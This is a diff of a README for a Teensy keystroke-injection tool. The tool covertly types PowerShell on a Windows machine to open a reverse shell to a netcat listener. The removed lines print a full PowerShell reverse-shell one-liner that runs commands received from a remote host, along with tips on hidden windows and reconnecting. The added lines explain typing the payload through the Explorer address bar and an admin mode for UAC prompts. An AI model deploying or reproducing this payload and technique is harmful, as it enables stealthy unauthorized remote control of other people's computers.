@@ -12,13 +12,8 @@ amount of time, and in a stealthy manner.
 It uses the abilities of the Teensy boards to deploy a small powershell script, using keyboard emulation.  
 The goal of this project was to find a way to launch a TCP Client that would connect to a netcat listener.  
 
-To make it as stealthy as possible, we use the "Run" window, that can be accessed by pressing Windows +R.  
-Tho, the amount of text is limited to 260 characters. So we need to run a PowerShell prompt in "Hidden"  
-windowstyle, and pass the commands to execute a TCP client. Unfortunately there isn't enough place to  
-make the client respond to the commands sent by the netcat listener within 260 chars. 
-
-The solution is to wait for the netcat listener to send the complete version of the TCP Client and execute it.  
-That way we can have feedback from a distant machine of what's happening on commands execution sent from the server.  
+In order to type and execute the payload, we use the explorer address bar in order to type powershell commands 
+that can be longer than 260 chars. That's why we don't use Windows + R "Run" window. 
 
 In case you need an elevated PowerShell prompt to execute script from the server, there is an admin mode  
 that will run PowerShell as admin and wait for a button to be pressed to accept the UAC prompt if there is one.  
@@ -40,18 +35,13 @@ PowerShell prompt, then wait for the button 2 to be pressed in order to continue
 Simply run netcat on linux, like this :  
 `netcat -l -p 1337`
 
-I advice you to run it inside of a loop in bash, so you can exit it with Ctrl+C, because that's needed if you  
-send another version of the TCP Client to the client (if you use -k netcat will close when you hit Ctrl+C)  
+I advice you to run it inside of a loop in bash, so you can exit it with Ctrl+C, so you can reconnect to your client if needed.
 
-Once you recieve a connexion, push the complete TCP Client to the client so you can have feedback
-on what you execute :  
+Once you recieve a connexion, you can start executing powershell commands / scripts on the client, for example : 
 ```  
-$b=[text.encoding]::UTF8;while(1){try{;$u=(New-Object Net.Sockets.TCPClient("0.0.0.0",1337)).GetStream();$w=New-Object byte[] 65535;while(($i=$u.Read($w,0,$w.Length)) -ne 0){$d=$b.GetString($w,0,$i);$v=$b.GetBytes((iex $d 2>&1|Out-String));$u.Write($v,0,$v.Length)}}catch{}}
+whoami
+ipconfig
 ```  
-(don't forget to replace the IP and port to fit your situation) 
-
-Restart your netcat listener so the new client version can connect to your port  
-Done! You can execute any PowerShell command and get the output in your netcat listener!
 
 ## Demo : 
 [![5 Seconds Reverse Shell](https://img.youtube.com/vi/8NpX56rHsYY/0.jpg)](https://www.youtube.com/watch?v=8NpX56rHsYY)
